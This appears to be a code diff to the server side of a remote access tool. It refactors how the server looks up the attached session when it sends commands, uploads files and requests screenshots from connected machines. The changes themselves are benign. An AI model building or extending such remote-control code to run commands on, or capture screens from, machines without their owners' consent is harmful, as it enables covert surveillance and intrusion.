@@ -59,7 +59,7 @@ class Server(object):
         if name:
             if self.connectedUsers.get(name):
                 self.userAttached = name
-                self.userCwd = self.connectedUsers.get(self.userAttached)['currentDirectory']
+                self.userCwd = self.getCurrentUser()['currentDirectory']
                 printr(f'[green] You are attached to a section with {name} now!')
             else:
                 printr(f'[red] There is no open session with [yellow]{name}.')
@@ -115,7 +115,7 @@ class Server(object):
             if args:
                 try:
                     if Path(args).is_file():
-                        connection = self.connectedUsers[self.userAttached]['conn']
+                        connection = self.getCurrentUser()['conn']
                         connection.send(self.lastCommand.encode())
                         
                         namefile, extension, file = self.splitFile(args)
@@ -144,7 +144,7 @@ class Server(object):
 
         if self.userAttached:
             if args:
-                connection = self.connectedUsers[self.userAttached]['conn']
+                connection = self.getCurrentUser()['conn']
                 connection.send(self.lastCommand.encode())
                 header = loads(connection.recv(512))
                 if header["sucess"]:
@@ -161,7 +161,7 @@ class Server(object):
         self.checkFolders()
 
         if self.userAttached:
-            connection = self.connectedUsers[self.userAttached]['conn']
+            connection = self.getCurrentUser()['conn']
             connection.send('/screenshot'.encode())
             header = loads(connection.recv(512))
             self.receiveFile(connection, header)
@@ -293,7 +293,7 @@ class Server(object):
         self.lastCommand = command
 
         if self.userAttached: # if exists session attached
-            connection = self.connectedUsers[self.userAttached]['conn'] # getting the socket object from the current user
+            connection = self.getCurrentUser()['conn'] # getting the socket object from the current user
             connection.send(command.encode())
             header = loads(connection.recv(512)) # receiving header of the command
             self.userCwd = header['currentDirectory'] # updating the current directory you are
